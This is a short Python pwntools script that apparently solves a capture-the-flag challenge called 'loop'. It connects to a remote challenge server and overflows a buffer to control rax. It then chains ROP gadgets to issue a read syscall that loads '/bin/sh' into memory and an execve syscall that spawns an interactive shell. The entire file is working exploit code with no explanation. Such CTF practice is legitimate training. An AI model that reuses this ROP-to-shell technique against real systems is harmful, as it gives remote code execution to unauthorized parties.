from pwn import *
import time

e = context.binary = ELF("./loop")
p = remote('0.cloud.chals.io', 34997)
r = ROP(e)

pop_rdi = p64((r.find_gadget(['pop rdi', 'ret']))[0])
pop_rsi = p64((r.find_gadget(['pop rsi', 'ret']))[0])
pop_rdx = p64((r.find_gadget(['pop rdx', 'ret']))[0])
syscall = p64(0x401042)
data = 0x666000


def write_rax(rax):
    '''33 bytes to write rax, 73 bytes to overflow [rsp]'''
    return cyclic(33)+p64(rax)+cyclic(32)


def sys_exec():
    '''syscall(SYS_exec, path=*data, argv=0, envp=0)'''
    pad = write_rax(constants.SYS_execve)
    chain = pop_rdi
    chain += p64(data)
    chain += pop_rsi
    chain += p64(0x0)
    chain += pop_rdx
    chain += p64(0x0)
    chain += syscall
    p.sendline(pad + chain)


def sys_read():
    '''syscall(SYS_read, fd=0x0, buf=*data, len=9)'''
    pad = write_rax(constants.SYS_read)
    chain = pop_rdi
    chain += p64(0x0)
    chain += pop_rsi
    chain += p64(data)
    chain += pop_rdx
    chain += p64(0x9)
    chain += syscall
    p.sendline(pad + chain)


def send_sh():
    '''send "/bin/sh"'''
    time.sleep(1)
    p.sendline(b"/bin/sh\0")


sys_read()
send_sh()
sys_exec()

p.interactive()
